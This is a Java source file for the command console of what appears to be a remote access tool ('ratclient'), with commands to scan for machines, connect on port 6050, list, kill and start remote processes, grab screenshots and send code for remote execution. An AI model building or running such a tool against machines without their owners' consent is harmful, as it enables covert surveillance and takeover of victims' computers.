package ratclient;
import java.util.ArrayList;

public class CommandLib { //Library object that contains commands
	
	ArrayList<Command> commands = new ArrayList<Command>(40);
	
	public RatClient client; //client reference object
	public ConsoleWriter out; //used to write out to the console
	public boolean connected; //are we connected?
	private Console console; //console reference object
	private Run currentCommand; //current command going to run
	private boolean cancel; //Cancel the running command with ^C
	
	public void initCommands() { //Create all commands
		commands.add(new Command("scan", "\tScan for machines", "\tscan") {
			public void run(int argc, String argv[]) {
				client.scan(get());
				try {
					waitIdle();
				} catch (InterruptedException e) {
				}
				
				end();
			}
		});
		
		commands.add(new Command("help", "\tShow help", "\thelp") { //
			public void run(int argc, String argv[]) {
				out.println("COMMAND NAME\t\tDESCRIPTION");
				line();
				for(int i = 0;i<commands.size();i++) {
					if(commands.get(i).getName().length() > 7) {
						out.println(commands.get(i).getName() + "\t   " + commands.get(i).getDesc());
					} else {
						out.println(commands.get(i).getName() + "\t\t   " + commands.get(i).getDesc());
					}
				}
				end();
			}
		});
		
		commands.add(new Command("connect", "\tConnect to specified ip address", "\tconnect <ip>") { //
			public void run(int argc, String argv[]) {
				
				if(argc < 2) {
					invalid(this);
					return;
				}
				if(client.connect(argv[1], 6050)) {
					connected = true;
					console.setPrefix(argv[1] + ">");
				}
				end();
			}
		});
		
		commands.add(new Command("disconnect", "\tDisconnect from a server", "\tdisconnect") { //
			public void run(int argc, String argv[]) {
				if(connected) {
					client.send("disconnect");
					client.disconnect();
					connected = false;
					console.setPrefix(">");	
				} else {
					out.println("Not connected to a server");
				}
				end();
			}
		});
		
		commands.add(new Command("exit", "\tExit the console", "\texit") { //
			public void run(int argc, String argv[]) {
				System.exit(0);
			}
		});
		
		commands.add(new Command("clear", "\tClear screen", "\tclear") { //
			public void run(int argc, String argv[]) {
				console.clear();
				end();
			}
		});
		
		commands.add(new Command("tasklist", "\tList tasks running on server", "\ttasklist") { //
			public void run(int argc, String argv[]) {
				if(!connected()) {
					return;
				}
				client.send("tasklist");
				client.waitForResponse(get());
				end();
			}
		});
		
		commands.add(new Command("taskkill", "\tKill a process on a server", "\ttaskkill <processname>") { //
			public void run(int argc, String argv[]) {
				if(argc < 2) {
					invalid(this);
					return;
				}
				if(!connected()) {
					return;
				}
				client.send("taskkill " + argv[1]);
				client.waitForResponse(get());
				end();
			}
		});
		
		commands.add(new Command("start", "\tStart a process on a server", "\tstart <processname>\n\tuse <s> for spaces in filenames") { //
			public void run(int argc, String argv[]) {
				if(argc < 2) {
					invalid(this);
					return;
				}
				if(!connected()) {
					return;
				}
				client.send("start " + argv[1]);
				client.waitForResponse(get());
				end();
			}
		});
		
		commands.add(new Command("screen", "\tGet screenshot of server", "\tscreen") { //
			public void run(int argc, String argv[]) {
				if(!connected()) {
					return;
				}
				client.send("screen");
				client.waitForImageResponse(get());
				end();
			}
		});
		

		
		commands.add(new Command("exec", "\tExecute code", "\texec <name>.<extension>") {
			public void run(int argc, String argv[]) {
				if(argc < 2) {
					invalid(this);
					return;
				}
				
				if(!connected()) {
					return;
				}
				
				try {
					TextInputWindow txtInput = new TextInputWindow(get());
					out.println("Type Ctrl-X to Exit");
					waitIdle();
					String txt = "";
					char[] a = txtInput.getTxt().toCharArray();
					for(int i = 0;i<a.length;i++) {
						if(a[i] == 10 || a[i] == '\n' || a[i] == '\r') {
							txt = txt + "\\n";
						} else if(a[i] == ' ') {
							txt = txt + "\\s";
						} else {
							txt = txt + a[i];
						}
					}
					txt.replaceAll("[\n\r]", "*");
					txt.replaceAll(" ", "\\s");
					String text = "";
					for(int i = 0;i<txt.length();i++) {
						if((int)txt.charAt(i) == 10) {
							text = text + ' ';
						} else {
							text = text + txt.charAt(i);
						}
					}
					String str = "exec " + argv[1] + " <-START-> " + text + " <-END->";
					client.send(str);
				} catch (Exception e) {
					e.printStackTrace();
				}
				end();
			}
		});
		
		
		//Basic template commands for reference
		/*commands.add(new Command("hello", "\tSend hello", "\thello <msg>") {
			public void run(int argc, String argv[]) {
				if(argc < 2) {
					invalid(this);
					return;
				}
				if(!connected()) {
					return;
				}
				client.send("hello " + argv[1]);
				client.waitForResponse();
			}
		});
		
		*/
		/*
		 
		 commands.add(new Command("name", "\tdesc", "\tsyntax") {
			public void run(int argc, String argv[]) {
				
			}
		});
		
		 */
	}
	

	
	public CommandLib get() {
		return this;
	}
	
	public void disconnect() {
		client.disconnect();
		connected = false;
		console.setPrefix(">");	
	}
	
	private boolean idle;
	
	public void waitIdle() throws InterruptedException { //wait for command to be processed on server
		synchronized(this) {
			while(!this.idle) {
				this.wait();
				if(this.idle) {
					break;
				}
			}
		}
	idle = false;
	}
	
	public void wake() {
		synchronized(this) {
			this.idle = true;
			this.notifyAll();
		}
	}
	
	public CommandLib(Console console) {
		connected = false;
		this.console = console;
		this.cancel = false;
		initCommands();
	}
	
	public boolean connected() { //are we conneted to a server?
		if(!connected) {
			out.println("Must be connected to a server");
			end();
			return false;
		}
		return true;
	}
	
	private void invalid(Command cmd) { //Invalid command method, utility
		out.println("Invalid syntax");
		out.println("DESC:");
		out.println(cmd.getDesc());
		out.println("SYNTAX:");
		out.println(cmd.getSyntax());
		end();
	}
	
	public void setOutput(ConsoleWriter out) {
		this.out = out;
	}
	
	public void setClient(RatClient client) {
		this.client = client;
	}

	public void command(String cmd) { //Run command, check library for command
		cancel = false;
		
		try {
			boolean found = false; //found command?
			int index = -1; //default index is -1
			String args[] = cmd.split(" "); //split arguments into a string array
			
			for(int i = 0;i<commands.size();i++) { //loop through command objects, find command that matches
				
				if(commands.get(i).getName().equals(args[0])) {
					found = true; //save index and set found to true
					index = i;
				}
			}
			if(found && index != -1) { //Make sure we found the commmand
				if(args.length > 1 && args[1].equals("?")) { //if they added a ? to the end of command
					out.clearLine(); //clear line, prep for output to console
					out.print(commands.get(index).getName());
					for(int i = 1;i<args.length;i++) {
						out.print(" " + args[i]);	
					}
					out.print("\n");//space for data underneath name
					invalid(commands.get(index)); //print help menu
				} else {
					out.disableInput();//Otherwise we have a valid command, turn off input
					currentCommand = new Run(args.length, args, index); //run the command
					currentCommand.start(); //run command in seperate thread
				}
			} else if(args[0].length() == 0) {//Just hit enter, show newline
				//nothing
			} else { //Invalid command, not found, show help msg
				out.clearLine();
				out.print(args[0]);
				for(int i = 1;i<args.length;i++) {
					out.print(" " + args[i]);	
				}
				out.print("\n");
				out.println("Command \'" + args[0] + "\' not recognized");
				end();
			}
		} catch(ArrayIndexOutOfBoundsException e) {
		} catch(Exception e) {
			e.printStackTrace();
		}
	}
	
	public void end() {//end of output, fix console caret and re-enable input
		if(!cancel) {
			out.clearLine();
			out.print(out.getPrefix());
			out.enableInput();
			out.fixCaret();
		}
	}
	
	public void line() { //print a line across the console
		out.println("==============================================================================");
	}
	
	public void killCurrentCommand() { //kill command with ^C
		cancel = true;
		if(currentCommand != null) {
			currentCommand.interrupt();
		}
		
		out.clearLine();
		out.print(out.getPrefix());
		out.enableInput();
		out.fixCaret();
	}
	
	class Run extends Thread { //Run command in seperate thread
		int length;
		String[] args;
		int index;
		
		public Run(int length, String[] args, int index) { //save all data for running command
			this.index = index;
			this.length = length;
			this.args = args;
		}
		
		
		public void run() {
			out.clearLine(); //clear input line, so it doesn't get overwritten
			out.print(commands.get(index).getName()); //re-write the command sent
			for(int i = 1;i<args.length;i++) {
				out.print(" " + args[i]);	//print out args
			}
			out.print("\n");
			commands.get(index).run(length, args);//run the command
		}
	}
}